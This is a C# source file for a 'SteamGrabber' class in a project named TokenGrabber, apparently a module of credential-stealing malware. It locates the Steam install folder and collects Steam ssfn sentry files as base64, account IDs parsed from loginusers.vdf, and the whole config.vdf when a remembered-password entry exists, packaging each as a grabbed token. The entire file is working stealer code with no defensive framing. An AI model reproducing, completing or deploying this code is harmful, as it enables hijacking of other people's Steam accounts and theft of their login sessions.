namespace TokenGrabber.Grabbers;

using System.Text.RegularExpressions;
using TokenGrabber.Models;

internal sealed partial class SteamGrabber : ITokenGrabber
{
    private static readonly string SteamPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        if (!Directory.Exists(SteamPath))
            return tokens;

        ExtractSsfnFiles(tokens);
        ExtractLoginUsers(tokens);
        ExtractRememberPassword(tokens);

        return tokens;
    }

    private void ExtractSsfnFiles(List<GrabbedToken> tokens)
    {
        var files = Directory.GetFiles(SteamPath, "ssfn*");
        foreach (var file in files)
        {
            var content = Convert.ToBase64String(File.ReadAllBytes(file));
            tokens.Add(new GrabbedToken
            {
                Token = content,
                Platform = "Steam",
                Source = $"SSFN:{Path.GetFileName(file)}",
                ExtractedAt = DateTime.UtcNow
            });
        }
    }

    private void ExtractLoginUsers(List<GrabbedToken> tokens)
    {
        var configPath = Path.Combine(SteamPath, "config", "loginusers.vdf");
        if (!File.Exists(configPath)) return;

        var content = File.ReadAllText(configPath);
        var matches = SteamIdRegex().Matches(content);

        foreach (Match match in matches)
        {
            tokens.Add(new GrabbedToken
            {
                Token = match.Groups[1].Value,
                Platform = "Steam",
                Source = "loginusers.vdf",
                ExtractedAt = DateTime.UtcNow
            });
        }
    }

    private void ExtractRememberPassword(List<GrabbedToken> tokens)
    {
        var configPath = Path.Combine(SteamPath, "config", "config.vdf");
        if (!File.Exists(configPath)) return;

        var content = File.ReadAllText(configPath);
        if (content.Contains("\"RememberPassword\""))
        {
            tokens.Add(new GrabbedToken
            {
                Token = Convert.ToBase64String(File.ReadAllBytes(configPath)),
                Platform = "Steam",
                Source = "config.vdf",
                ExtractedAt = DateTime.UtcNow
            });
        }
    }

    [GeneratedRegex(@"""(\d{17})""", RegexOptions.Compiled)]
    private static partial Regex SteamIdRegex();
}
